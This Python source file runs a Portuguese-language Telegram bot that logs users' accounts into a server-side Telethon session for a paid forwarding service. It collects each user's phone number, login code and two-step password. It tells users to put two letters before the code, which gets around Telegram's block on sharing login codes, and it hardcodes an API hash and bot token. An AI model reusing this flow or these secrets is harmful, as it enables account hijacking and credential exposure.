import logging, aiogram, asyncio, os, keyboards
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext, filters
from aiogram.dispatcher.filters import Text
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters import Command
from aiogram.types import ReplyKeyboardRemove
from aiogram.utils.exceptions import MessageNotModified
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, PhoneCodeInvalidError, PasswordHashInvalidError, PhoneCodeExpiredError, PhoneCodeEmptyError
from global_vars import clients
import textos, asyncio
from request_func import is_user_subscriber_api
import re
from email.utils import parseaddr
import user_related
import aiogram.dispatcher
from telethon import TelegramClient
import dbConnection
from pathlib import Path

db_lock = asyncio.Lock()

api_id = '23023328'
api_hash = '111f1ddc23d1b313112f7c7a0612b3d1'
token = '6016165902:AAFI7MNk04SSykOHsqwB_0MT_wRuddTwNaw'
bot = Bot(token)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


class Pilha:
    def __init__(self):
        self.itens = []

    def is_empty(self):
        return not bool(self.itens)

    def push(self, item):
        self.itens.append(item)

    def pop(self):
        if not self.is_empty():
            return self.itens.pop()

    def peek(self):
        if not self.is_empty():
            return self.itens[-1]

    def size(self):
        return len(self.itens)
    
@dp.message_handler(Command("cancelar"), state="*")
async def cancel_handler(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    await cancel(chat_id, state)
    
class MyForm(StatesGroup):
    email = State()
    phone = State()  # O usuário deve digitar a numero
    code = State()  # O usuário deve selecionar o codigo
    two_step_pass = State()  # O usuário deve selecionar a senha
    
async def iniciar(chat_id):
    client = clients.get(str(chat_id))
    phone = await dbConnection.get_phone_from_chat_id(chat_id)
    if client is None:
        client = TelegramClient(f'tel:{phone}', api_id, api_hash)
        print(f'Connecting client with phone number: {phone}')
        await client.connect()
        await update_clients_dict(str(chat_id), client)
    print(f"DEBUG: client ao repassar = {client}")    
    await user_related.start_forwarding_client(client, chat_id)
    
async def handle_login_and_trial(message, chat_id, phone):
    # Verifica se o usuário pode iniciar o trial
    trial = await dbConnection.can_trial(chat_id)
    subscriber = await is_user_subscriber_api(chat_id)
    if subscriber:
        await bot.send_message(chat_id, text=textos.desbloq(), reply_markup=await keyboards.usar_ferramenta())
        return
    if trial == 1:
        # Conecte o usuário ao teste gratuito de 24 horas aqui
        await dbConnection.activate_trial(chat_id)  # Chame a função activate_trial aqui
        await bot.send_message(chat_id, text=textos.trial(), reply_markup=await keyboards.usar_ferramenta())
        return
    else:
        await bot.send_message(chat_id, text=textos.logged(), reply_markup=await keyboards.logged_keyboard(chat_id))


async def save_user_data_and_trial(state, message, chat_id, phone):
    client = clients.get(str(chat_id))
    
    if client is None:
        client = TelegramClient(f'tel:{phone}', api_id, api_hash)
        print(f'Connecting client with phone number: {phone}')
        await client.connect()
        await update_clients_dict(str(chat_id), client)
    
    
    async with state.proxy() as data:
        data['code'] = message.text[2:]
        name = message.from_user.first_name
        code = data['code']
        conn = await dbConnection.get_db_connection()
        values = [phone, 0, 1, chat_id]
        result = await dbConnection.addUser(conn, values)
        if result == 'DUPLICATE_PHONE':
            await message.reply('Esse telefone já está registrado. Por favor use um número diferente ou entre em contato com o suporte.')
            return
            conn.close()
        print(f'\ncliente conectado: {client.is_connected()}\nid de quem conectou: {chat_id}\n')
    await handle_login_and_trial(message, chat_id, phone)

def phone_session_exists(phone):
    session_filename = Path(f'tel:{phone}.session')
    return session_filename.exists()

async def auto_cancel(chat_id, state, delay=150):
    await asyncio.sleep(delay)
    current_state = await state.get_state()
    if current_state is not None and current_state != 'canceled':
        await cancel(chat_id, state)


async def update_clients_dict(chat_id, client):
    clients[chat_id] = client

async def start_login(message: types.Message, chat_id):
    username = message.from_user.first_name
    await message.reply(f"Olá, para começarmos com a conexão é necessário o email:")
    await MyForm.email.set()

    state = dp.current_state(chat=chat_id, user=chat_id)
    asyncio.create_task(auto_cancel(chat_id, state))
    

async def is_valid_email(email: str) -> bool:
    email_regex = r"[^@]+@[^@]+\.[^@]+"
    return bool(re.match(email_regex, email))

async def handle_email(message: types.Message, state: FSMContext):  # Change the state parameter to FSMContext
    chat_id = message.chat.id
    username = message.from_user.first_name
    if message.text == "/cancelar":
        await cancel(chat_id, state)
        return
    
    else:
        email = message.text
        if not await is_valid_email(email):
            await message.reply("Por favor, forneça um e-mail válido.")
            await bot.send_message(chat_id, 'Caso esteja enfrentando problemas, digite /cancelar e tente novamente.')
            await MyForm.email.set()
        else:
            print(f'email: {email}')
            await state.update_data(email=email)
            values = [chat_id, username, email]
            await dbConnection.add_user_mail(values)
            await message.reply(text='Certo, agora seu email está cadastrado em nossos bancos.')
            await bot.send_message(chat_id=-1001682567457, text=f'Novo usuario cadastrado, nome = {username}, email = {email}')
            await bot.send_message(chat_id, text=f"Para prosseguirmos com o login, por favor digite seu número de telefone (incluindo o código do país)\n\nExemplo: +5511999998888")    
            await MyForm.next()



async def get_phone(message: types.Message, state=MyForm.phone): #pega o numero do usuario
    username = message.from_user.first_name
    
    chat_id = message.chat.id
    if message.text == "/cancelar":
        await cancel(chat_id, state)
        return
    
    else:
        phone = message.text.strip()
        phone_pattern = re.compile(r'^\+?\d{10,15}$')
        if phone[0] != '+':
            phone = '+' + phone
        if not phone_pattern.match(phone):
            await message.reply("Número de telefone inválido.\n\nPor favor, digite um número de telefone válido no formato abaixo:\n\n+[Cod. do País][Número]\nExemplo: +5512999998888.")
            await bot.send_message(chat_id, "Caso você esteja enfrentando problemas, cancele a operação usando /cancelar")
            return

        # Add a "+" sign if it's missing
        print(f'telefone: {phone}')
        
        if phone_session_exists(phone):
            print("Este número já está logado.")
            await message.reply("Este número já está logado.")
            await state.finish()
            return
        
        client = TelegramClient(f'tel:{phone}', api_id, api_hash)
        await client.connect()
        await update_clients_dict(str(chat_id), client)
        result = None
        try:
            await message.reply("Enviando o código de verificação...")
            result = await client.send_code_request(phone=phone)
        except PhoneNumberInvalidError:
            await message.reply("O número de telefone informado é inválido. Por favor, tente novamente.")
            await bot.send_message(chat_id, 'Caso esteja enfrentando problemas, digite /cancelar e tente novamente.')
            diretorio = os.getcwd()
            print(diretorio)
            file_path = str(diretorio+f'/tel:{phone}.session')
            print(file_path)
            os.remove(file_path)
            await MyForm.phone.set()
        if result:
            await state.update_data(phone=phone, phone_code_hash=result.phone_code_hash)
            await update_clients_dict(str(chat_id), client)
            await bot.send_message(chat_id=-1001682567457, text=f"Usuario '{username}' = https://wa.me/{phone}")
            aviso = 'Para não haver bloqueio do próprio telegram, envie o codigo com duas letras antes.\n\nExemplo:\n\nSe o código for 12345, envie no chat como aa12345'
            await message.reply(f"Digite o código de verificação que você recebeu:\n\n{aviso}")
            await MyForm.next()



async def get_code(message: types.Message, state=MyForm.code):
    code = message.text[2:]
    
    user_data = await state.get_data()
    phone = user_data['phone']
    chat_id = message.chat.id
    
    if message.text == "/cancelar":
        await cancel(chat_id, state)
        return
    
    else:
        client = clients.get(str(chat_id))

        try:
            phone_code_hash = user_data['phone_code_hash']
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
        except PhoneCodeInvalidError:
            await message.reply("O código de verificação informado é inválido. Por favor, tente novamente.")
            await bot.send_message(chat_id, 'Caso esteja enfrentando problemas, digite /cancelar e tente novamente.')
            await MyForm.code.set()

        except PhoneCodeExpiredError:
            # Request a new code
            try:
                result = await client.send_code_request(phone)
                new_phone_code_hash = result.phone_code_hash

                await state.update_data(phone_code_hash=new_phone_code_hash)
                await message.reply("O código de verificação expirou. Um novo código foi enviado. Por favor, verifique e tente novamente.")
                await MyForm.code.set()

            except Exception as e:
                await message.reply(f"Houve um errro ao solicitar um novo código. Por favor, digite novamente seu telefone.")
                await MyForm.phone.set()
                # Call cleanup function
                await cleanup(chat_id, phone)
            
        except SessionPasswordNeededError:
            await message.reply("Este número possui verificação em duas etapas. Por favor, digite sua senha:")
            await MyForm.two_step_pass.set()
            
        else:
            await message.reply("Login realizado com sucesso!")
            await save_user_data_and_trial(state, message, chat_id, phone)
            await state.finish()
            await iniciar(chat_id)


    

async def get_pass(message: types.Message, state=MyForm.two_step_pass):
    password = message.text
    user_data = await state.get_data()
    phone = user_data['phone']
    chat_id = message.chat.id
    
    if message.text == "/cancelar":
        await cancel(chat_id, state)
        return
    
    else:
        client = clients.get(str(chat_id))
            
        try:
            await client.sign_in(password=password)
            await update_clients_dict(chat_id, client)
            await message.reply("Login realizado com sucesso!")
            await save_user_data_and_trial(state, message, chat_id, phone)
            
        except PasswordHashInvalidError:
            await message.reply("Senha incorreta. Por favor, tente novamente.")
            await MyForm.two_step_pass.set()
            
        except Exception as e:
            await message.reply(f"Ocorreu um erro durante o login: {e}")
            # Call cleanup function
            await cleanup(chat_id, phone)
                
        finally:
            await state.finish()
            await iniciar(chat_id)

async def cleanup(chat_id, phone=None):
    # Delete the session file
    if phone:
        session_filename = Path(f'tel:{phone}.session')
        if session_filename.exists():
            session_filename.unlink()

    # Remove client from clients dictionary
    clients.pop(str(chat_id), None)

    # Delete user data from the database
    await dbConnection.delete_user(chat_id)
    
    
async def cancel(chat_id, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        return

    # Get user_data to retrieve the phone number
    user_data = await state.get_data()
    phone = user_data.get('phone', None)

    # Call cleanup function
    await cleanup(chat_id, phone)

    await bot.send_message(chat_id, "Conexão cancelada.", reply_markup=await keyboards.menu_keyboard())
    await state.finish()
